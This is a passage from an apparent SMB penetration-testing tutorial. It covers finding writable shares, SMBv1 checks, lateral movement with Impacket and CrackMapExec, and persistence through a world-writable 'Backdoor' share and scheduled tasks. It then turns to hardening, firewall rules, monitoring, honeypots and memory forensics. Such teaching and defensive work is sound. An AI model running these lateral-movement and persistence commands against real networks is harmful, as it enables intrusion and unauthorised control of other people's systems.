# Use SMB with Kerberos
smbclient //server.domain.com/share -k

# Mount using Kerberos
sudo mount -t cifs //server.domain.com/share /mnt/share -o sec=krb5
```

### Finding and Exploiting Writable Shares

Writable shares can be particularly valuable for attackers as they allow for file uploads and potential execution.

```python
from impacket import smbconnection
import os

def find_writable_shares(target, username="", password="", domain=""):
    try:
        smb = smbconnection.SMBConnection(target, target)
        smb.login(username, password, domain)
        print(f"[+] Successfully authenticated to {target}")
        
        # List shares
        shares = smb.listShares()
        writable_shares = []
        
        for share in shares:
            share_name = share['shi1_netname']
            
            # Skip common non-valuable shares
            if share_name in ['ADMIN$', 'IPC$', 'C$', 'PRINT$']:
                continue
                
            print(f"[*] Testing share: {share_name}")
            
            # Test if we can write to the share
            try:
                test_file = f"write_test_{os.urandom(4).hex()}.txt"
                test_content = b"This is a write test. Please delete this file."
                
                # Try to write a file
                smb.putFile(share_name, test_file, test_content)
                print(f"[+] Successfully wrote to {share_name}")
                writable_shares.append(share_name)
                
                # Clean up
                try:
                    smb.deleteFile(share_name, test_file)
                except:
                    print(f"[!] Could not remove test file from {share_name}")
            except Exception as e:
                print(f"[-] Cannot write to {share_name}: {str(e)}")
        
        return writable_shares
    except Exception as e:
        print(f"[-] Failed to connect: {str(e)}")
        return []

# Example usage
writable = find_writable_shares("192.168.1.10", "user", "password")
print(f"Writable shares: {writable}")
```

### SMB Version-Specific Attacks

#### Exploiting SMBv1

SMBv1 is particularly vulnerable and should be disabled in all modern environments.

```bash
# Check if SMBv1 is enabled
nmap --script smb-protocols -p 445 192.168.1.10

# Attack using Metasploit
use auxiliary/scanner/smb/smb1
set RHOSTS 192.168.1.10
run
```

#### Downgrade Attacks

Some attacks involve forcing the target to downgrade to a less secure SMB version.

```python
from impacket.smbconnection import SMBConnection

def force_smb1(target):
    # Connect with SMB1 only
    try:
        smb = SMBConnection(target, target, preferredDialect="SMB1")
        print(f"[+] Successfully connected to {target} using SMB1")
        return True
    except Exception as e:
        print(f"[-] Failed to connect using SMB1: {str(e)}")
        return False

# Example usage
force_smb1("192.168.1.10")
```

## SMB Lateral Movement

SMB is often used for lateral movement within a network after initial access is obtained.

### PsExec-style Movement

```bash
# Using Impacket's PsExec
psexec.py domain/administrator:password@192.168.1.10

# Using CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -p password -x "whoami" --exec-method smbexec
```

### WMI over SMB

Windows Management Instrumentation (WMI) can be leveraged over SMB connections.

```bash
# Using Impacket's wmiexec
wmiexec.py domain/administrator:password@192.168.1.10 "whoami"

# Using CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -p password -x "whoami" --exec-method wmiexec
```

### SCM (Service Control Manager) via SMB

```bash
# Using Impacket's services
services.py domain/administrator:password@192.168.1.10 create -name badservice -display Fake -path "cmd.exe /c calc.exe"
services.py domain/administrator:password@192.168.1.10 start -name badservice
services.py domain/administrator:password@192.168.1.10 delete -name badservice
```

## SMB Persistence

### Creating Admin Shares

```powershell
# PowerShell command to create a custom share
New-SmbShare -Name "Backdoor" -Path "C:\Windows\Temp" -FullAccess "Everyone"
```

### Using Scheduled Tasks via SMB

```bash
# Using Impacket's atexec
atexec.py domain/administrator:password@192.168.1.10 "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
```

## Defending Against SMB Attacks

### Disable SMBv1

```powershell
# PowerShell command to disable SMBv1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 0 -Force

# Check if SMBv1 is disabled
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
```

### Enable SMB Signing

```powershell
# Enable SMB signing
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" RequireSecuritySignature -Type DWORD -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" RequireSecuritySignature -Type DWORD -Value 1 -Force
```

### Restrict Anonymous Access

```powershell
# Restrict anonymous access
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" RestrictAnonymous -Type DWORD -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" RestrictAnonymousSAM -Type DWORD -Value 1 -Force
```

### Block SMB at the Firewall

```bash
# Block SMB at the firewall (Linux)
sudo iptables -A INPUT -p tcp --dport 445 -j DROP
sudo iptables -A INPUT -p tcp --dport 139 -j DROP

# Block SMB at the firewall (Windows)
netsh advfirewall firewall add rule name="Block SMB In" dir=in action=block protocol=TCP localport=445
netsh advfirewall firewall add rule name="Block SMB Out" dir=out action=block protocol=TCP localport=445
```

### Monitor SMB Traffic

```bash
# Using Wireshark display filter
wireshark -i eth0 -k -f "port 445 or port 139"

# Using tcpdump
sudo tcpdump -n -i eth0 port 445 or port 139
```

## SMB Honeypots

Setting up honeypots can help detect and analyze SMB-based attacks.

### Using HoneySMB

```bash
# Clone HoneySMB
git clone https://github.com/honeynet/honeysmbfs.git
cd honeysmbfs

# Install dependencies
pip install -r requirements.txt

# Run HoneySMB
sudo python3 honeysmbfs.py -h 0.0.0.0 -p 445
```

## Advanced Forensics

### Analyzing SMB Traffic

```bash
# Capture SMB traffic
sudo tcpdump -i eth0 -w smb_capture.pcap port 445 or port 139

# Extract files from SMB sessions using Wireshark
# File > Export Objects > SMB
```

### Extracting SMB Artifacts from Memory

```bash
# Using Volatility
# Capture memory dump
sudo avml memory.raw

# Analyze SMB connections
volatility -f memory.raw --profile=Win10x64 netscan | grep -E '139|445'

# Extract SMB secrets from memory
volatility -f memory.raw --profile=Win10x64 mimikatz
```

## Cloud-Based SMB Services

### Azure Files

Azure Files is a cloud-based implementation of SMB.

```powershell
# Mount Azure File Share
$connectTestResult = Test-NetConnection -ComputerName <storage-account-name>.file.core.windows.net -Port 445
if ($connectTestResult.TcpTestSucceeded) {
    net use Z: \\<storage-account-name>.file.core.windows.net\<share-name> /u:AZURE\<storage-account-name> <storage-account-key>
} else {
    Write-Error "Unable to reach the Azure storage account via port 445"
}
```

### SMB Tunneling over HTTPS

```bash
# Using stunnel to tunnel SMB over HTTPS
# stunnel.conf
[smb]
client = yes
accept = 127.0.0.1:4445
connect = 192.168.1.10:443

# Run stunnel
stunnel stunnel.conf

# Connect to local port
smbclient //127.0.0.1:4445/share -U username
```

## Conclusion

Server Message Block (SMB) remains a critical protocol in modern networks despite its security challenges. Understanding how to enumerate, connect to, and secure SMB services is essential for both offensive security professionals and defenders. As demonstrated throughout this article, SMB offers numerous attack surfaces that malicious actors can exploit, from password attacks to protocol-specific vulnerabilities.

For defenders, implementing proper access controls, disabling legacy protocols, enabling encryption, and regularly updating systems can significantly reduce the risk posed by SMB services. For penetration testers and security researchers, understanding SMB's inner workings provides valuable insights into how to properly assess and secure network file sharing services.

As with any security-critical protocol, staying informed about the latest vulnerabilities and mitigation techniques is vital to maintaining a secure environment. By implementing defense-in-depth strategies and following security best practices, organizations can continue to benefit from SMB's functionality while minimizing its inherent risks.
